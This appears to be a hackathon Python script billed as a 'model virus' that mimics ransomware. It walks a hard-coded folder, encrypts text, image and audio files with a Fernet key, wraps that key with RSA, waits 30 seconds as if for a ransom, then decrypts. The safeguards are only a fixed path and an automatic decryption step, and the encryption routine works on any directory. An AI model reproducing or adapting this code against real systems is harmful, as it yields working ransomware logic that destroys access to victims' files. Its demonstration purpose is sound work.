#HAKCTHON HAXERS

#This is a model virus that has been retrofitted to work only inside a specific folder on my system. You will need to change the paths if you want to try it yourself.

#In essence, what this does is securely encrypt all the files, and descrypts them 30 seconds later using a key. This is supposed to resemble an abridged Ransomware attack.

from cryptography.fernet import Fernet 
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from time import sleep

#PLEASE NOTICE. WE PUT ALL THE KEYS IN THE SAME DIRECTORY FOR SIMPLICITY REASONS. WE UNDERSTAND THAT RANSOMWARE WOULDN'T ACUTALLY DO THAT


class MockVirus:
 
    #the chosen filetypes to encrypt
    fileTypes = ["txt", "png", "jpg", "mp3"]

    def __init__(self):
        self.key = None
        self.fernet = None
        self.publicKey = None
        self.cdrive = "C:\\Users\\tjmon\\3D Objects\\C Drive" #Used as a simulated Computer for demonstration
    
    #uses fernet to make a key
    def makeKey(self):
        self.key =  Fernet.generate_key()
        self.fernet = Fernet(self.key)

    #writes fernet symmetric key to a doc (later going to be used to encrypt the private key)
    def writeKey(self): 
        with open("SymKey.doc", "wb") as doc:
            doc.write(self.key)
        with open(f"{self.cdrive}\\SymKeySecret.doc", "wb") as doc:
            doc.write(self.key)

    #This Encrypts the Private key
    def encryptSymmetricKey(self):
        with open("symKey.doc", "rb") as doc:
            symmetricKey = doc.read()
        
        with open("SymKey.doc", "wb") as doc:
            self.publicKey = RSA.import_key(open(f"{self.cdrive}/publicKeyDoc.doc").read())
            publicKeyEncrypter =  PKCS1_OAEP.new(self.publicKey)
            encSymmetricKey = publicKeyEncrypter.encrypt(symmetricKey)
            doc.write(encSymmetricKey)
        
        #Creates a file w/ public key
        with open(f"{self.cdrive}/PUBLICKEY.doc", "wb") as doc:
            doc.write(encSymmetricKey)
       
        #removes trace of private key and its exact encryption
        self.key = encSymmetricKey
        self.fernet = None

    #changes specific files. Uses if/else to choose whether to encrypt or decrypt
    def alterFile(self, path, encrypted=False):
        with open(path, "rb") as doc: 
            # Reads the contents of the file
            contents = doc.read()
            if not encrypted:
                print(contents)
                print("> File encrypted")
                alteredContents = self.fernet.encrypt(contents)
            else:
                alteredContents = self.fernet.decrypt(contents)
                print("> File decrpyted")
        with open(path, "wb") as doc:
            doc.write(alteredContents)


    #Runs through system checking if the files are encrypted or not
    def alterSystem(self, encrypted=False):
        system = os.walk(self.cdrive, topdown=True)
        for root, directories, files in system:
            for file in files:
                path = os.path.join(root, file)
                if not file.split(".")[-1] in self.fileTypes:
                    continue
                if not encrypted:
                    self.alterFile(path)
                else:
                    self.alterFile(path, encrypted=True)

    def decrypterFunc(self):
        stopper = True
        while stopper == True:
            print('brapping....') 
            sleep(1)
            with open(f"{self.cdrive}\\SymKeySecret.doc", "rb") as doc:
                self.key = doc.read()
                self.fernet = Fernet(self.key)
                self.alterSystem(encrypted=True) #redirects to alterSystem which redirects to alterFile
            print('All Done ;)')
            stopper = False

def main():
    start = MockVirus() 
    start.makeKey() 
    start.alterSystem() 
    start.writeKey()
    start.encryptSymmetricKey() 

    sleep(30) #simulates time of enrypted files. Ransom would be paid during this time
    start.decrypterFunc()

    #cleans up workspace
    os.remove("C:\\Users\\tjmon\\3D Objects\\C Drive\\PUBLICKEY.doc")
    os.remove("C:\\Users\\tjmon\\3D Objects\\C Drive\\publicKeyDoc.doc")

#Uses RSA algorithm to generate keys
key = RSA.generate(2048)

#Creates Documents for Public/Private Keys
priKey = key.exportKey()
with open("C:\\Users\\tjmon\\3D Objects\\C Drive\\privateKeyDoc.doc", "wb") as privDoc:
    privDoc.write(priKey) 


pubKey = key.public_key().exportKey()
with open("C:\\Users\\tjmon\\3D Objects\\C Drive\\publicKeyDoc.doc", "wb") as pubDoc:
    pubDoc.write(pubKey)

print("> Done")
#encrypted twice to increase ambiguity 

if __name__ == "__main__":
    main()
